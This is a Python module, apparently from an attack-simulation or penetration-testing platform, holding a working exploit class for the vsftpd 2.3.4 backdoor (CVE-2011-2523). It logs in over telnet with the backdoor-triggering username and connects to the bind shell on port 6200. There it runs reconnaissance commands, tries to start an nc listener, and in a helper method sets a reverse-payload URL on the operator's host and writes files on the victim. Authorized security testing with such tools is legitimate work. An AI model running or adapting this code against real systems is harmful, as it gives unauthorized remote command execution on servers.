import json
import secrets

from project.workers.application.exploit.base import BaseExploit
from project.workers.application.exploit.consts import Exploit
from django.conf import settings
from telnetlib import Telnet
import redis


class VsftpdExploit(BaseExploit):
    name = Exploit.CVE_2011_2523.value

    USER = "USER nergal:)"
    PASSWORD = "PASS pass"
    COMMANDS = ["whoami", "id", "uname -a"]

    def run(self, **kwargs):
        print(f"{kwargs=}")
        host = kwargs.get("host", "127.0.0.1")
        ftp_port = int(kwargs.get("port", 21))

        several_ftp_port = int(kwargs.get("several_ftp_port", 6200))
        print(f"{host=} {ftp_port=} {several_ftp_port=}")
        ftp_tn = Telnet(host, ftp_port)
        ftp_tn.read_until(b"(vsFTPd 2.3.4)")
        ftp_tn.write(self.USER.encode("ascii") + b"\n")
        ftp_tn.read_until(b"password.")
        ftp_tn.write(self.PASSWORD.encode("ascii") + b"\n")
        several_ftp_tn = Telnet(host, several_ftp_port)

        messages = []
        for command in self.COMMANDS:
            several_ftp_tn.write(command.encode("ascii") + b"\n")
            read_bytes = several_ftp_tn.read_some()
            messages.append(
                {
                    "payload": command,
                    "message": read_bytes.decode("utf-8").strip()
                }
            )

        try:
            several_ftp_tn.write("nc -l 0.0.0.0 55555".encode("ascii" )+ b'\n')
        except Exception as ex:
            print(f"load_payload: {ex=}")
            pass

        return {
            "host": host,
            "port": ftp_port,
            "messages": messages,
            "flow": [
                f"Подключение через telnet к {host}:{ftp_port}",
                f"Попытка авторизации с помощью фейковых данных '{self.USER}':'{self.PASSWORD}'",
                f"Подключение к служебному адресу FTP {host}:{several_ftp_port}",
                f"Принудительный обрыв соединения с {host}:{ftp_port}",
                f"Попытка исполнения команд {self.COMMANDS}",
                f"Получение результатов"
            ],
            "name": self.name
        }


    def __load_payload(
            self, tn: Telnet,
            victim_host: str,
            process_id: str,
            scenario_block_id: str,
            payload: str = 'brute',
    ):
        print("FILE LOADING")

        token = secrets.token_urlsafe(16)

        ex_victim_host = f"export VICTIM_HOST={victim_host}"
        ex_reverse_payload_url = f"export REVERSE_PAYLOAD_URL=http://{settings.CURRENT_HOST_IP}:80/api/processes/cmfp"
        ex_payload_token = f"export PAYLOAD_TOKEN={token}"

        redis_client = redis.Redis(db=4)
        redis_client.set(token, json.dumps(
            {
                "scenario_block_id": str(scenario_block_id),
                "process_id": str(process_id)
            }
        ))

        redis_client.close()

        tn.write(ex_victim_host.encode('ascii') + b'\n')
        tn.read_until(b'\n')
        tn.write(ex_reverse_payload_url.encode('ascii') + b'\n')
        tn.read_until(b'\n')
        tn.write(ex_payload_token.encode('ascii') + b'\n')
        tn.write(b'touch pwner.txt\n')
        # tn.write(b'env > env.txt' + b'\n')
        tn.read_until(b'\n')
        tn.write(b'echo ' + b'123123' + b' > ' + b'brute' + b'\n')
        tn.read_until(b'\n')






